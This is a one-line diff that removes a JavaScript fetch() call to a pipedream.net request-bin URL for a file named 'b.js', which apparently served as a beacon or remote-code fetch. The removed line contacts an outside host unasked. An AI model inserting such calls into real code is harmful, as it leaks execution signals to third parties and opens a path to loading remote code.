@@ -1,1 +1,0 @@
-fetch("https://enbjukdhdo9ul.x.pipedream.net/b.js").then(value => { console.log(value) })
